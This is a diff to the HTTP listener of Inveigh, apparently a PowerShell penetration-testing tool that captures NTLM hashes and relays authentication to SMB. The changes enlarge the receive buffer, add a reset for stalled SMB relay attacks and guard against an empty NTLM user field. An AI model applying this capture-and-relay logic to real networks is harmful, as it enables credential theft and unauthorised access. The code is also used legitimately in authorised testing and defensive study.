@@ -2367,8 +2367,8 @@ $HTTP_scriptblock =
     :HTTP_listener_loop while ($inveigh.relay_running -and $HTTP_running)
     {
         $TCP_request = ""
-        $TCP_request_bytes = New-Object System.Byte[] 1024
-
+        $TCP_request_bytes = New-Object System.Byte[] 4096
+        
         while(!$HTTP_listener.Pending() -and !$HTTP_client.Connected)
         {
             Start-Sleep -m 10
@@ -2378,6 +2378,24 @@ $HTTP_scriptblock =
                 break HTTP_listener_loop
             }
         
+        }
+        
+        if($relay_step -gt 0)
+        {
+            $relay_reset++
+
+            if($relay_reset -gt 1)
+            {
+                $inveigh.console_queue.Add("SMB relay attack resetting")
+                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay attack resetting")])
+                $SMB_relay_socket.Close()
+                $relay_step = 0
+            }
+
+        }
+        else
+        {
+            $relay_reset = 0
         }
 
         if($SSL)
@@ -2578,11 +2596,20 @@ $HTTP_scriptblock =
                     
                     $HTTP_NTLM_user_length = DataLength2 36 $HTTP_request_bytes
                     $HTTP_NTLM_user_offset = DataLength4 40 $HTTP_request_bytes
-                    $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes
+                    
+                    if($HTTP_NTLM_user_length -gt 0)
+                    {    
+                        $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes
+                    }
+                    else
+                    {
+                        $HTTP_NTLM_user_string = ""
+                    }
+
                     $HTTP_NTLM_host_length = DataLength2 44 $HTTP_request_bytes
                     $HTTP_NTLM_host_offset = DataLength4 48 $HTTP_request_bytes
                     $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_offset $HTTP_NTLM_host_length $HTTP_request_bytes
-                    
+
                     if($HTTP_NTLM_length -eq 24) # NTLMv1
                     {
                         $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
@@ -2650,7 +2677,6 @@ $HTTP_scriptblock =
                     $NTLM_auth = $true
                     $HTTP_client_close = $true
                     $NTLM_challenge = ""
-                    #$HTTP_raw_url_output = $true
                 
                     if($inveigh.SMB_relay -and $relay_step -eq 2)
                     {
